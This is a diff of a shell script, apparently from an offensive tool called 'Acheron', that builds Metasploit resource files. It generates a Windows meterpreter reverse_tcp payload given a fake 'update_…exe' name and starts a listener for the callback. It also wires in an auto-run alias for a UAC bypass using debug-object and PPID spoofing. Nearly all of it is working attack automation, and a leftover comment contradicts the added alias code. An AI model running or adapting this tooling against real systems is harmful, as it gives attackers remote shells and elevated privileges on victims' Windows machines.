@@ -5,12 +5,13 @@ OUTFILE="/tmp/acheron_listener_${PORT}.rc"
 BYPASS_RC="/tmp/bypassuac.rc"
 
 # Generate dynamic bypass UAC script with LHOST/LPORT
-cat > "/tmp/bypassuac.rc" << 'BYPASS_EOF'
-# UAC Bypass Method 59 - Debug Object / PPID Spoofing
-# Run MANUALLY in meterpreter: bypassuac
+# Generate dynamic bypass UAC script with LHOST/LPORT
+# Generate payload name at generation time
+PAYLOAD_NAME="update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe"
 
-# Generate random payload name
-set PAYLOAD_NAME update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe
+cat > "/tmp/bypassuac.rc" << BYPASS_EOF
+# UAC Bypass Method 59 - Debug Object / PPID Spoofing
+# Run MANUALLY in meterpreter: resource /tmp/bypassuac.rc
 
 # Generate new Acheron payload with same LHOST/LPORT
 run generate -f exe -o /tmp/$PAYLOAD_NAME -p windows/x64/meterpreter/reverse_tcp -o LHOST=$LHOST -o LPORT=$PORT
@@ -32,8 +33,16 @@ set LHOST $LHOST
 set LPORT $PORT
 set ExitOnSession false
 
+# Create alias 'bypassuac' automatically on session creation
+set InitialAutoRunScript multi_console_command -rc /tmp/bypassuac_alias.rc
+
 exploit -j -z
 RC
+
+# Create alias script
+cat > /tmp/bypassuac_alias.rc << ALIAS_EOF
+alias bypassuac resource /tmp/bypassuac.rc
+ALIAS_EOF
 
 # Removed alias script generation - user will run bypassuac manually
 echo "[*] Run: msfconsole -r $OUTFILE" >&2
